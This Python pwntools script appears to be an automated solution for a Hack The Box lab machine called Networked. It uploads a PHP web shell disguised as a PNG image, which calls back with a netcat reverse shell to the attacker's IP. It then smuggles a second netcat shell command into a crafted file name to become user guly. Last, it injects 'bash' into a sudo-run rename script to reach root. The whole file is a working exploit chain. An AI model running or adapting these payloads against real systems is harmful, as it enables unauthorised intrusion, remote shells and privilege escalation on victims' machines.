# -*- coding: utf-8 -*-

from pwn import *
import requests
import subprocess
import netifaces as ni

ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']



def shell(user):
	data="-----------------------------169128251116063042041106433445\r\nContent-Disposition: form-data; name=\"myFile\"; filename=\"test.php.png\"\r\nContent-Type: image/png\r\n\r\nGIF87a;<?php echo exec(\"/bin/nc -e /bin/sh {} 1337\");?>\r\n-----------------------------169128251116063042041106433445\r\nContent-Disposition: form-data; name=\"submit\"\r\n\r\ngo!\r\n-----------------------------169128251116063042041106433445--\r\n".format(ip)
	r = requests.post('http://10.10.10.146/upload.php',data=data,proxies={'http':'http://127.0.0.1:8080'},headers={'Content-Type':'multipart/form-data;boundary=---------------------------169128251116063042041106433445'})
	log.info('Triggering Shell')
	l = listen(1337)
	image=ip.replace('.','_')+'.php.png'
	subprocess.Popen(['/bin/curl','http://10.10.10.146/uploads/{}'.format(image)],stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	l.wait_for_connection()
	log.info("Got www-data shell")
	if user=="www-data":
		l.sendline("/usr/bin/python -c 'import pty;pty.spawn(\"/bin/bash\")'")
		l.interactive()
	else:
		l.sendline("cd /var/www/html/uploads && touch -- ';nc -c bash {} 1234'".format(ip))
		p = listen(1234).wait_for_connection()
		log.info("Got guly shell")
		p.sendline("/usr/bin/python -c 'import pty;pty.spawn(\"/bin/bash\")'")
		if user=="guly":
			p.interactive()
		else:
			p.sendline("sudo -u root /usr/local/sbin/changename.sh")
			p.recvline()
			p.sendline("a bash")
			p.recvline()
			p.sendline("c")
			p.recvline()
			p.sendline("d")
			p.recvline()
			p.sendline("d")
			p.sendline("/usr/bin/python -c 'import pty;pty.spawn(\"/bin/bash\")'")
			p.interactive()

if __name__=="__main__":
	print '''                  .----.
      .---------. | == |
      |.-"""""-.| |----|
      ||       || | == |
      ||       || |----|
      |'-.....-'| |::::|
      `"")---(""` |___.|
     /:::::::::::\   _  
    /:::=======:::\  `\`\

   `---------------`  '-' 
			Networked by MrR3boot'''
	print "1. www-data"
	print "2. guly"
	print "3. root"
	input = raw_input("> ").strip()
	if input == "1":
		shell('www-data')
	elif input == "2":
		shell("guly")
	else:
		shell("root")
